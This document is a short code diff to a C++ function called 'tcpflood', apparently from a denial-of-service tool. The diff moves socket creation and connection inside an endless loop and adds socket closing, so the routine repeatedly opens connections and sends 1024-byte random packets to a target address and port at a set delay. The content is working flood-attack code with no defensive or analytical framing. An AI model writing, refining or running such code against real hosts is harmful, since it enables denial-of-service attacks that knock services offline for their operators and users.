@@ -19,16 +19,17 @@ void tcpflood()
     target.sin_addr.s_addr = inet_addr(target_ip);
     target.sin_port = htons(target_port);
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(SOCKADDR_IN));
-
     char packet[1024]{0};
     for(int i = 0; i < 1024; i++) {
         packet[i] = rand();
     }
 
-    while(true) {
+    while(true)
+    {
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(SOCKADDR_IN));
         send(sock, packet, sizeof(packet), 0);
+        closesocket(sock);
         Sleep(attack_delay);
     }
 }
